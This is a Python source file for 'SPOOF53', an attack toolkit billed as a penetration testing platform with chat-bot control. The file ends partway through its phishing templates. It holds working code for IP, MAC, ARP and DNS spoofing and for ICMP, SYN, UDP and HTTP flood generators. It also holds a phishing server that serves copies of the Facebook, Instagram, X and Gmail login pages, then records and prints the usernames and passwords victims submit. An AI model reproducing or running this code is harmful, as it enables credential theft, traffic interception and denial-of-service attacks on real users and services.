#!/usr/bin/env python3
"""
🕶️ SPOOF53 
Version: 1.0.0
Author: Ian Carter Kulani
Description: Complete penetration testing & network analysis platform with multi-platform bot integration
             Supports Discord, Telegram, WhatsApp, Slack, and Signal with 5000+ security commands
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import pickle
import queue
import http.server
import tempfile
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, Counter
from functools import wraps


# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# WhatsApp via Selenium
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, send, sr1
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# WhoIs
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# Paramiko for SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# =====================
# COLOR SCHEME
# =====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    
    # Status colors
    SUCCESS = GREEN
    ERROR = RED
    WARNING = YELLOW
    INFO = CYAN
    DEBUG = DIM

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".spoof53"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "spoof53.db")
LOG_FILE = os.path.join(CONFIG_DIR, "spoof53.log")
REPORT_DIR = "spoof53_reports"
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
SIGNAL_SESSION_DIR = os.path.join(CONFIG_DIR, "signal_session")
COMMAND_HISTORY_DIR = os.path.join(CONFIG_DIR, "history")

# Create directories
for directory in [CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, TRAFFIC_LOGS_DIR,
                  PHISHING_DIR, CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR,
                  WHATSAPP_SESSION_DIR, SIGNAL_SESSION_DIR, COMMAND_HISTORY_DIR]:
    Path(directory).mkdir(parents=True, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SPOOF53 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("Spoof53")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager for all data"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self._init_tables()
    
    def _init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                results TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT,
                severity TEXT,
                description TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL,
                original_value TEXT,
                spoofed_value TEXT,
                target TEXT,
                success BOOLEAN
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                username TEXT,
                role TEXT DEFAULT 'user',
                is_authorized BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
    
    def log_command(self, command: str, source: str, success: bool, output: str, execution_time: float):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_scan(self, target: str, scan_type: str, results: Dict, success: bool):
        """Log scan results"""
        try:
            self.cursor.execute('''
                INSERT INTO scan_results (target, scan_type, results, success)
                VALUES (?, ?, ?, ?)
            ''', (target, scan_type, json.dumps(results), success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description)
                VALUES (?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def save_phishing_link(self, link_id: str, platform: str, url: str):
        """Save phishing link"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, phishing_url)
                VALUES (?, ?, ?)
            ''', (link_id, platform, url))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
    
    def save_credential(self, link_id: str, username: str, password: str, ip: str, ua: str):
        """Save captured credential"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip, ua))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save credential: {e}")
    
    def update_platform_status(self, platform: str, enabled: bool, status: str, error: str = None):
        """Update platform status"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
            ''', (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update platform status: {e}")
    
    def add_user(self, user_id: str, platform: str, username: str, role: str = 'user'):
        """Add authorized user"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO users (user_id, platform, username, role, last_active)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (user_id, platform, username, role))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add user: {e}")
            return False
    
    def is_user_authorized(self, user_id: str, platform: str) -> bool:
        """Check if user is authorized"""
        try:
            self.cursor.execute('''
                SELECT is_authorized FROM users WHERE user_id = ? AND platform = ?
            ''', (user_id, platform))
            row = self.cursor.fetchone()
            return row is not None and row['is_authorized']
        except Exception as e:
            logger.error(f"Failed to check user authorization: {e}")
            return False
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scan_results')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_connections')
            stats['ssh_connections'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM spoofing_attempts')
            stats['spoofing_attempts'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    """Execute system commands with timeout and logging"""
    
    @staticmethod
    def execute(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        try:
            if shell:
                result = subprocess.run(
                    ' '.join(cmd) if isinstance(cmd, list) else cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            else:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            
            execution_time = time.time() - start_time
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'error': None if result.returncode == 0 else result.stderr,
                'exit_code': result.returncode,
                'execution_time': execution_time
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': f"Command timed out after {timeout} seconds",
                'error': 'Timeout',
                'exit_code': -1,
                'execution_time': timeout
            }
        except Exception as e:
            return {
                'success': False,
                'output': str(e),
                'error': str(e),
                'exit_code': -1,
                'execution_time': time.time() - start_time
            }

# =====================
# SPOOFING ENGINE
# =====================
class SpoofingEngine:
    """Network spoofing capabilities"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.running_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict[str, Any]:
        """Spoof IP address for outgoing packets"""
        result = {
            'success': False,
            'command': f"IP Spoofing: {original_ip} -> {spoofed_ip}",
            'output': '',
            'method': ''
        }
        
        # Using hping3 if available
        if shutil.which('hping3'):
            try:
                cmd = ['hping3', '-S', '-a', spoofed_ip, '-p', '80', target]
                exec_result = CommandExecutor.execute(cmd, timeout=5)
                if exec_result['success']:
                    result['success'] = True
                    result['output'] = f"IP spoofing using hping3"
                    result['method'] = 'hping3'
                    self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                    return result
            except:
                pass
        
        # Using Scapy
        if self.scapy_available:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80)
                send(packet, verbose=False)
                result['success'] = True
                result['output'] = f"IP spoofing using Scapy: Sent packet from {spoofed_ip} to {target}"
                result['method'] = 'scapy'
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy method failed: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, False)
        return result
    
    def spoof_mac(self, interface: str, new_mac: str) -> Dict[str, Any]:
        """Spoof MAC address"""
        result = {
            'success': False,
            'command': f"MAC Spoofing on {interface}: -> {new_mac}",
            'output': '',
            'method': ''
        }
        
        original_mac = self._get_mac_address(interface)
        
        if shutil.which('macchanger'):
            try:
                CommandExecutor.execute(['ip', 'link', 'set', interface, 'down'], timeout=5)
                mac_result = CommandExecutor.execute(['macchanger', '--mac', new_mac, interface], timeout=10)
                CommandExecutor.execute(['ip', 'link', 'set', interface, 'up'], timeout=5)
                
                if mac_result['success']:
                    result['success'] = True
                    result['output'] = mac_result['output']
                    result['method'] = 'macchanger'
                    self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                    return result
            except Exception as e:
                result['output'] = f"macchanger method failed: {e}"
        
        # Using ip command
        try:
            CommandExecutor.execute(['ip', 'link', 'set', interface, 'down'], timeout=5)
            cmd_result = CommandExecutor.execute(['ip', 'link', 'set', interface, 'address', new_mac], timeout=5)
            CommandExecutor.execute(['ip', 'link', 'set', interface, 'up'], timeout=5)
            
            if cmd_result['success']:
                result['success'] = True
                result['output'] = f"MAC address changed to {new_mac}"
                result['method'] = 'ip'
                self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                return result
        except Exception as e:
            result['output'] = f"ip method failed: {e}"
        
        result['output'] = "MAC spoofing failed. Install macchanger or ensure root privileges."
        self.db.log_spoofing('mac', original_mac, new_mac, interface, False)
        return result
    
    def _get_mac_address(self, interface: str) -> str:
        """Get MAC address"""
        try:
            result = CommandExecutor.execute(['cat', f'/sys/class/net/{interface}/address'], timeout=2)
            if result['success']:
                return result['output'].strip()
        except:
            pass
        return "00:00:00:00:00:00"
    
    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        """Perform ARP spoofing"""
        result = {
            'success': False,
            'command': f"ARP Spoofing: {target_ip} -> {spoof_ip}",
            'output': '',
            'method': ''
        }
        
        if shutil.which('arpspoof'):
            try:
                cmd = ['arpspoof', '-i', interface, '-t', target_ip, spoof_ip]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"arp_{target_ip}"] = process
                
                result['success'] = True
                result['output'] = f"ARP spoofing started: {target_ip} -> {spoof_ip}"
                result['method'] = 'arpspoof'
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"arpspoof method failed: {e}"
        
        result['output'] = "ARP spoofing failed. Install dsniff (arpspoof)."
        self.db.log_spoofing('arp', target_ip, spoof_ip, interface, False)
        return result
    
    def dns_spoof(self, domain: str, fake_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        """Perform DNS spoofing"""
        result = {
            'success': False,
            'command': f"DNS Spoofing: {domain} -> {fake_ip}",
            'output': '',
            'method': ''
        }
        
        hosts_file = "/tmp/dnsspoof.txt"
        try:
            with open(hosts_file, 'w') as f:
                f.write(f"{fake_ip} {domain}\n")
                f.write(f"{fake_ip} www.{domain}\n")
        except:
            pass
        
        if shutil.which('dnsspoof'):
            try:
                cmd = ['dnsspoof', '-i', interface, '-f', hosts_file]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                
                result['success'] = True
                result['output'] = f"DNS spoofing started: {domain} -> {fake_ip}"
                result['method'] = 'dnsspoof'
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnsspoof method failed: {e}"
        
        result['output'] = "DNS spoofing failed. Install dnsspoof."
        self.db.log_spoofing('dns', domain, fake_ip, interface, False)
        return result
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict[str, Any]:
        """Stop running spoofing processes"""
        if spoof_id and spoof_id in self.running_spoofs:
            try:
                self.running_spoofs[spoof_id].terminate()
                del self.running_spoofs[spoof_id]
                return {'success': True, 'output': f"Stopped spoofing: {spoof_id}"}
            except:
                pass
        
        for spoof_id, process in list(self.running_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.running_spoofs.clear()
        return {'success': True, 'output': "Stopped all spoofing processes"}

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGenerator:
    """Generate various types of network traffic"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
    
    def generate_icmp_flood(self, target_ip: str, duration: int, rate: int = 100) -> Dict[str, Any]:
        """Generate ICMP flood"""
        return self._generate_flood('icmp', target_ip, duration, rate)
    
    def generate_syn_flood(self, target_ip: str, port: int, duration: int, rate: int = 100) -> Dict[str, Any]:
        """Generate SYN flood"""
        return self._generate_flood('syn', target_ip, duration, rate, port)
    
    def generate_udp_flood(self, target_ip: str, port: int, duration: int, rate: int = 100) -> Dict[str, Any]:
        """Generate UDP flood"""
        return self._generate_flood('udp', target_ip, duration, rate, port)
    
    def generate_http_flood(self, target_ip: str, port: int = 80, duration: int = 30, rate: int = 50) -> Dict[str, Any]:
        """Generate HTTP flood"""
        return self._generate_flood('http', target_ip, duration, rate, port)
    
    def _generate_flood(self, flood_type: str, target_ip: str, duration: int, rate: int, port: int = None) -> Dict[str, Any]:
        """Generate flood traffic"""
        generator_id = f"{flood_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        def flood_thread():
            packets_sent = 0
            bytes_sent = 0
            end_time = time.time() + duration
            delay = 1.0 / max(1, rate)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    if flood_type == 'icmp':
                        size = self._send_icmp(target_ip)
                    elif flood_type == 'syn':
                        size = self._send_syn(target_ip, port or 80)
                    elif flood_type == 'udp':
                        size = self._send_udp(target_ip, port or 53)
                    elif flood_type == 'http':
                        size = self._send_http(target_ip, port or 80)
                    else:
                        break
                    
                    if size > 0:
                        packets_sent += 1
                        bytes_sent += size
                    
                    time.sleep(delay)
                except Exception as e:
                    logger.error(f"Flood error: {e}")
                    time.sleep(0.1)
            
            self.db.log_traffic(flood_type, target_ip, packets_sent, bytes_sent, 'completed')
            
        thread = threading.Thread(target=flood_thread, daemon=True)
        thread.start()
        self.active_generators[generator_id] = thread
        
        return {
            'success': True,
            'generator_id': generator_id,
            'type': flood_type,
            'target': target_ip,
            'duration': duration,
            'rate': rate,
            'message': f"{flood_type.upper()} flood started on {target_ip} for {duration}s at {rate} packets/sec"
        }
    
    def _send_icmp(self, target_ip: str) -> int:
        """Send ICMP echo request"""
        try:
            if self.scapy_available:
                from scapy.all import IP, ICMP, send
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                result = CommandExecutor.execute(['ping', '-c', '1', '-W', '1', target_ip], timeout=2)
                return 64 if result['success'] else 0
        except:
            return 0
    
    def _send_syn(self, target_ip: str, port: int) -> int:
        """Send SYN packet"""
        try:
            if self.scapy_available:
                from scapy.all import IP, TCP, send
                packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                return 40 if result == 0 else 0
        except:
            return 0
    
    def _send_udp(self, target_ip: str, port: int) -> int:
        """Send UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 64
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target_ip: str, port: int) -> int:
        """Send HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Spoof53"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def stop_generation(self, generator_id: str = None):
        """Stop traffic generation"""
        if generator_id and generator_id in self.stop_events:
            self.stop_events[generator_id].set()
            return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True

# =====================
# PHISHING SERVER
# =====================
class PhishingHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for phishing pages"""
    
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/?'):
            self.send_phishing_page()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            
            username = form_data.get('email', form_data.get('username', form_data.get('user', [''])))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.save_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent
                )
                print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except Exception as e:
            logger.error(f"Error in POST: {e}")
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.cursor.execute(
                    'UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?',
                    (self.server_instance.link_id,)
                )
                self.server_instance.db.conn.commit()

class PhishingServer:
    """Phishing server for hosting fake login pages"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.link_id = None
        self.html_content = None
        self.port = 8080
        self.running = False
    
    def start(self, link_id: str, platform: str, port: int = 8080) -> bool:
        """Start phishing server"""
        self.link_id = link_id
        self.port = port
        self.html_content = self._get_template(platform)
        
        handler = PhishingHandler
        handler.server_instance = self
        
        try:
            self.server = http.server.HTTPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Failed to start server: {e}")
            return False
    
    def stop(self):
        """Stop phishing server"""
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()
    
    def get_url(self) -> str:
        """Get server URL"""
        local_ip = self._get_local_ip()
        return f"http://{local_ip}:{self.port}"
    
    def _get_template(self, platform: str) -> str:
        """Get phishing template"""
        templates = {
            'facebook': self._facebook_template(),
            'instagram': self._instagram_template(),
            'twitter': self._twitter_template(),
            'gmail': self._gmail_template(),
            'linkedin': self._linkedin_template(),
            'github': self._github_template(),
            'paypal': self._paypal_template(),
            'amazon': self._amazon_template(),
            'netflix': self._netflix_template(),
            'spotify': self._spotify_template(),
            'microsoft': self._microsoft_template(),
            'apple': self._apple_template(),
            'whatsapp': self._whatsapp_template(),
            'telegram': self._telegram_template(),
            'discord': self._discord_template()
        }
        return templates.get(platform, self._custom_template())
    
    def _facebook_template(self):
        return """<!DOCTYPE html>
<html><head><title>Facebook</title>
<style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:8px;padding:20px;width:400px}.logo{color:#1877f2;font-size:40px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px}button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;font-size:12px}</style></head>
<body><div class="login-box"><div class="logo">facebook</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _instagram_template(self):
        return """<!DOCTYPE html>
<html><head><title>Instagram</title>
<style>body{font-family:-apple-system;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px}.logo{font-family:cursive;font-size:50px;text-align:center}input{width:100%;padding:9px;margin:5px 0;background:#fafafa;border:1px solid #dbdbdb}button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;margin-top:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;font-size:12px}</style></head>
<body><div class="login-box"><div class="logo">Instagram</div>
<form method="POST"><input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _twitter_template(self):
        return """<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>body{font-family:-apple-system;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}.logo{font-size:40px;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;color:#e7e9ea;border-radius:4px}button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px}.warning{margin-top:20px;padding:12px;background:#1a1a1a;color:#e7e9ea;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">𝕏</div><h2>Sign in to X</h2>
<form method="POST"><input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _gmail_template(self):
        return """<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>body{font-family:'Google Sans',Roboto;background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:28px;padding:48px 40px;width:400px}.logo{text-align:center;color:#1a73e8}input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px}.warning{margin-top:30px;padding:12px;background:#e8f0fe;color:#202124;text-align:center}</style></head>
<body><div class="login-box"><div class="logo"><h1>Gmail</h1></div><h2>Sign in</h2>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _linkedin_template(self):
        return """<!DOCTYPE html>
<html><head><title>LinkedIn</title>
